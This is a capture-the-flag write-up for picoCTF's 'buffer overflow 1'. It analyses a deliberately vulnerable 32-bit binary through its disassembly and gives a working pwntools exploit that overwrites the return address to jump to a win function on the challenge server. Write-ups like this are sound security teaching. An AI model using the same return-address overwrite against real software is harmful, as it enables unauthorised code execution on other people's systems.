# buffer overflow 1

#### Information Given

Control the return address

Now we're cooking! You can overflow the buffer and return to the flag function in the program. You can view source here. And connect with it using:

nc saturn.picoctf.net 54881

## Step 1

Analyze the binary Information

```
arch     x86                                                                                                                                                                                                   
baddr    0x8048000                                                                                                                                                                                             
binsz    14541                                                                                                                                                                                                 
bintype  elf                                                                                                                                                                                                   
bits     32                                                                                                                                                                                                    
canary   false                                                                                                                                                                                                 
injprot  false                                                                                                                                                                                                 
class    ELF32                                                                                                                                                                                                 
compiler GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0                                                                                                                                                            
crypto   false                                                                                                                                                                                                 
endian   little                                                                                                                                                                                                
havecode true                                                                                                                                                                                                  
intrp    /lib/ld-linux.so.2                                                                                                                                                                                    
laddr    0x0                                                                                                                                                                                                   
lang     c                                                                                                                                                                                                     
linenum  true                                                                                                                                                                                                  
lsyms    true                                                                                                                                                                                                  
machine  Intel 80386                                                                                                                                                                                           
nx       false                                                                                                                                                                                                 
os       linux                                                                                                                                                                                                 
pic      false
relocs   true
relro    partial
rpath    NONE
sanitize false
static   false
stripped false
subsys   linux
va       true
```

## Step 2

Dry run

```sh
ghostkey :: pocs/picoctf/buffer_overflow_1 ‹master*› » ./vuln 
Please enter your string: 
asdf
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
```

```sh
ghostkey :: pocs/picoctf/buffer_overflow_1 ‹master*› » ./vuln 
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Okay, time to return... Fingers Crossed... Jumping to 0x41414141

[1]    57915 segmentation fault  ./vuln
```

## Step 3

Dump all funcs

```
0x08049000  _init
0x08049040  printf@plt
0x08049050  gets@plt
0x08049060  fgets@plt
0x08049070  getegid@plt
0x08049080  puts@plt
0x08049090  exit@plt
0x080490a0  __libc_start_main@plt
0x080490b0  setvbuf@plt
0x080490c0  fopen@plt
0x080490d0  setresgid@plt
0x080490e0  _start
0x08049120  _dl_relocate_static_pie
0x08049130  __x86.get_pc_thunk.bx
0x08049140  deregister_tm_clones
0x08049180  register_tm_clones
0x080491c0  __do_global_dtors_aux
0x080491f0  frame_dummy
0x080491f6  win
0x08049281  vuln
0x080492c4  main
0x0804933e  get_return_address
0x08049350  __libc_csu_init
0x080493c0  __libc_csu_fini
0x080493c5  __x86.get_pc_thunk.bp
0x080493cc  _fini
```

We have a ```main``` function, ```vuln``` function, ```get_return_address``` function and a win function

## Step 4

Disassemble the ```main``` function

```
0x080492c4 <+0>:     endbr32
0x080492c8 <+4>:     lea    0x4(%esp),%ecx
0x080492cc <+8>:     and    $0xfffffff0,%esp
0x080492cf <+11>:    push   -0x4(%ecx)
0x080492d2 <+14>:    push   %ebp
0x080492d3 <+15>:    mov    %esp,%ebp
0x080492d5 <+17>:    push   %ebx
0x080492d6 <+18>:    push   %ecx
0x080492d7 <+19>:    sub    $0x10,%esp
0x080492da <+22>:    call   0x8049130 <__x86.get_pc_thunk.bx>
0x080492df <+27>:    add    $0x2d21,%ebx
0x080492e5 <+33>:    mov    -0x4(%ebx),%eax
0x080492eb <+39>:    mov    (%eax),%eax
0x080492ed <+41>:    push   $0x0
0x080492ef <+43>:    push   $0x2
0x080492f1 <+45>:    push   $0x0
0x080492f3 <+47>:    push   %eax
0x080492f4 <+48>:    call   0x80490b0 <setvbuf@plt>
0x080492f9 <+53>:    add    $0x10,%esp
0x080492fc <+56>:    call   0x8049070 <getegid@plt>
0x08049301 <+61>:    mov    %eax,-0xc(%ebp)
0x08049304 <+64>:    sub    $0x4,%esp
0x08049307 <+67>:    push   -0xc(%ebp)
0x0804930a <+70>:    push   -0xc(%ebp)
0x0804930d <+73>:    push   -0xc(%ebp)
0x08049310 <+76>:    call   0x80490d0 <setresgid@plt>
0x08049315 <+81>:    add    $0x10,%esp
0x08049318 <+84>:    sub    $0xc,%esp
0x0804931b <+87>:    lea    -0x1f60(%ebx),%eax
0x08049321 <+93>:    push   %eax
0x08049322 <+94>:    call   0x8049080 <puts@plt>
0x08049327 <+99>:    add    $0x10,%esp
0x0804932a <+102>:   call   0x8049281 <vuln>
0x0804932f <+107>:   mov    $0x0,%eax
0x08049334 <+112>:   lea    -0x8(%ebp),%esp
0x08049337 <+115>:   pop    %ecx
0x08049338 <+116>:   pop    %ebx
0x08049339 <+117>:   pop    %ebp
0x0804933a <+118>:   lea    -0x4(%ecx),%esp
0x0804933d <+121>:   ret
```

Disassemble ```vuln```

```
   0x08049281 <+0>:     endbr32
   0x08049285 <+4>:     push   %ebp
   0x08049286 <+5>:     mov    %esp,%ebp
   0x08049288 <+7>:     push   %ebx
   0x08049289 <+8>:     sub    $0x24,%esp
   0x0804928c <+11>:    call   0x8049130 <__x86.get_pc_thunk.bx>
   0x08049291 <+16>:    add    $0x2d6f,%ebx
   0x08049297 <+22>:    sub    $0xc,%esp
   0x0804929a <+25>:    lea    -0x28(%ebp),%eax
   0x0804929d <+28>:    push   %eax
   0x0804929e <+29>:    call   0x8049050 <gets@plt>
   0x080492a3 <+34>:    add    $0x10,%esp
   0x080492a6 <+37>:    call   0x804933e <get_return_address>
   0x080492ab <+42>:    sub    $0x8,%esp
   0x080492ae <+45>:    push   %eax
   0x080492af <+46>:    lea    -0x1f9c(%ebx),%eax
   0x080492b5 <+52>:    push   %eax
   0x080492b6 <+53>:    call   0x8049040 <printf@plt>
   0x080492bb <+58>:    add    $0x10,%esp
   0x080492be <+61>:    nop
   0x080492bf <+62>:    mov    -0x4(%ebp),%ebx
   0x080492c2 <+65>:    leave
   0x080492c3 <+66>:    ret
```

The ```vuln``` function calls gets on the 0x24 buffer then calls ```get_return_address```

## Step 4

After overflow the offset is at 0x2c

## Exploit

```python
import pwn
import struct

payload = b'A' * 0x2c + struct.pack("<I", 0x080491f6)

p = pwn.remote("saturn.picoctf.net", 63064)
p.recv()
p.sendline(payload)
p.recvline()
p.interactive()
```

- We set the payload to fill the 0x2c bytes

```
(.venv) ghostkey :: pocs/picoctf/buffer_overflow_1 ‹master*› » python exploit.py 
[+] Opening connection to saturn.picoctf.net on port 63064: Done
[*] Switching to interactive mode
picoCTF{REDACTED}[*] Got EOF while reading in interactive
$
```
